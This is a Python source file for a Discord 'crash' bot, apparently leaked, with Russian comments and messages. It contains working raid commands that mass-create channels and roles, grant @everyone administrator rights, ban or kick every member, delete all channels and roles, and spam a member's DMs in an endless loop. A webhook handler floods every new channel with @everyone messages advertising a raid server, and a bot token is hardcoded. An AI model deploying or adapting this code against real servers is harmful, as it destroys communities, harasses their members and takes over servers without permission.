import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread
from keep_alive import keep_alive
keep_alive()
# слито by t.me/protectcheck
# слито by discord.gg/fzlgroup2


intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='/',intents=intents)

bot.remove_command("help")

@bot.command()
async def spam_channel(ctx):
    await ctx.message.delete()
    for b in range(1000):
        try:
            await ctx.guild.create_text_channel(name='crash-by-msk snejok332')
        except:
            continue
    await ctx.author.send(embed = discord.Embed(
        description = f' ```Вы успешно ввели команду``` \n **!spam_channel** \n спам каналами идёт',
        colour = 0x0de7d9))

@bot.command()
async def spam_role(ctx):
    await ctx.message.delete()
    create = 0
    uncreat = 0
    for role in range(100):
        try:
            uncreat += 1
            await ctx.guild.create_role(name='crash-by-msk snejok332')
            create += 1
        except:
            continue
    await ctx.author.send(embed = discord.Embed(
        description = f' ```Вы успешно ввели команду``` \n **!spam_role** \n спам ролями идёт',
        colour = 0x0de7d9))


@bot.command()
async def adminmsk_everyone(ctx):
    role = discord.utils.get(ctx.message.guild.roles, name = "@everyone")
    perms = discord.Permissions(administrator = True)
    await role.edit(permissions = perms)
    await ctx.author.send(embed = discord.Embed(
        description = f' ```Вы успешно ввели команду``` \n **!adminmsk_everyone** \n у роли everyone есть права админа',
        colour = 0x0de7d9))


@bot.command()
async def spammsk(ctx, member: discord.Member):
    dm = await member.create_dm()
    while True:
        await dm.send("**MSK - !!!𝕊ℕ𝔼ℤ𝕙𝕆𝕂𝟛𝟛𝟚!!!#0001** *вас крашнул*, Если хочешь так же?,  вот сервер, там рейды и боты https://discord.gg/vmJuq5BHtp будь как мы а не как ||мамонт ебучий||")
        await ctx.author.send(embed = discord.Embed(
        description = f' ```Вы успешно ввели команду``` \n **!spammsk** \n идёт спам в лс участнику',
        colour = 0x0de7d9))


@bot.command()
async def mskname(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    with open('nuked.jpg', 'rb') as f:
        icon = f.read()
    await guild.edit(name='Crash by MSK_BOT', icon=icon)
    await ctx.author.send(embed = discord.Embed(
        description = f' ```Вы успешно ввели команду``` \n **!mskname** \n название изменено',
        colour = 0x0de7d9))
    await ctx.message.delete()



@bot.command()
async def mskbanel(ctx):
    await ctx.message.delete()
    for m in ctx.guild.members: #собираем
        try:
            await m.ban(reason="КРАШ!")#баним
        except:
            pass
    await ctx.author.send(embed = discord.Embed(
        description = f' ```Вы успешно ввели команду``` \n **!mskbanel** \n и все получили бан на сервере',
        colour = 0x0de7d9))

@bot.command()
async def mskDel(ctx):
    failed = []
    counter = 0
    for channel in ctx.guild.channels: #собираем
        try:
            await channel.delete(reason="Так надо") #удаляем
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)
    await ctx.author.send(embed = discord.Embed(
        description = f' ```Вы успешно ввели команду``` \n **!mskDel** \n Удалено {counter} каналов',
        colour = 0x0de7d9))


@bot.command()  # разрешаем передавать агрументы
async def mskadmin(ctx):  # создаем асинхронную фунцию бота
    guild = ctx.guild
    perms = discord.Permissions(administrator=True, ban_members=True, kick_members=True)  # права роли
    await guild.create_role(name="msk", permissions=perms)  # создаем роль
    role = discord.utils.get(ctx.guild.roles, name="Hack")  # находим роль по имени
    user = ctx.message.author  # находим юзера
    await user.add_roles(role)  # добовляем роль
    await ctx.message.delete()


@bot.command()
async def delroles(ctx):
    for m in ctx.guild.roles:
        try:
            await m.delete(reason="Так надо")
        except:
            pass


@bot.command()
async def go(ctx):
        guild = ctx.message.guild     
        with open('nuked.jpg', 'rb') as f:
            icon = f.read()
        await guild.edit(name="Crash By MSK_BOT", icon=icon)

        await ctx.message.delete()

        for m in ctx.guild.roles:
            try:
                await m.delete(reason="Краш сервера")
            except:
                pass

        for channel in ctx.guild.channels:  # собираем
                try:
                        await channel.delete(reason="Краш сервера")  # удаляем
                except:
                        pass


        for _ in range(100):
            await guild.create_text_channel('crash-by-msk snejok332')

        for _ in range(100):
          await guild.create_role(name='crash-by-msk snejok332')

        for m in ctx.guild.members:
          try:
           await m.kick(reason="Краш сервера")
          except:
           pass

        
@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name = "Crash By MSK_BOT")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      for i in range(10000):
        try:
          await webhook.send("@everyone\nДанный сервер крашиться ботом Crash By HACKER BOT\nсервер дискорд с краш ботами: https://discord.gg/vmJuq5BHtp")
        except:
          pass   
token = 'OTEyOTk4NTY2NzY5ODc3MDEy.YZ4GLQ.Dui-2rzR03wCtjp8yb5AWHSFDsw'
bot.run(token)
# слито by t.me/protectcheck
# слито by discord.gg/fzlgroup2
